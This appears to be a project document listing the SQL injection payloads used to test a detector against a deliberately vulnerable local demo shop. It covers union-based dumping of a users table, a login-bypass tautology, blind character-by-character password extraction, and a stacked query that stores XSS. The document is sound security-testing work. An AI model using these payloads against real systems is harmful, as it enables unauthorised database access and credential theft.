# Attack surface of the demo shop

The payloads used to verify each vulnerability, and what the detector does with
them. All of these succeed against `:5000` (unprotected) and are blocked at
`:8080` (proxied).

> These target the local demo app in `webserver/` only. It is deliberately
> vulnerable so the detector has something to be measured against.

## Product search — union-based injection

`/products?category=…`

```sql
peripherals' UNION SELECT id, username, password, email, 'x' FROM users--
```

Dumps the users table into the product listing: the injected `SELECT` matches
the five columns the template renders.

## Customer login — boolean-based blind injection

`POST /login`, `username` field

```sql
admin' OR 'a'='a';--
```

Tautology closes the string and comments out the password check.

## Product lookup — boolean-based blind injection

`/product?id=…`

Existence check — an error means the subquery returned rows:

```sql
1' AND CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN CAST('x' AS INTEGER) ELSE 1 END--
```

Character-by-character extraction of the stored password:

```sql
1' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--
1' AND SUBSTR((SELECT password FROM users LIMIT 1),2,1)='d'--
1' AND SUBSTR((SELECT password FROM users LIMIT 1),3,1)='m'--
1' AND SUBSTR((SELECT password FROM users LIMIT 1),4,1)='i'--
1' AND SUBSTR((SELECT password FROM users LIMIT 1),5,1)='n'--
```

## Product reviews — second-order injection into stored XSS

`POST /product`, `content` field

```sql
pwned'); UPDATE comments SET created_at='<script>alert(1)</script>';--
```

`add_comment` uses `executescript`, so the payload closes the `INSERT` and
appends its own `UPDATE`. The injected markup is stored and executes on a later
page view — the injection and the XSS are separate events, which is what makes
it second-order.

## sqlmap

Every endpoint was also run through `sqlmap`, protected and unprotected; the
raw output is in [`../sqlmap-reports/`](../sqlmap-reports/).
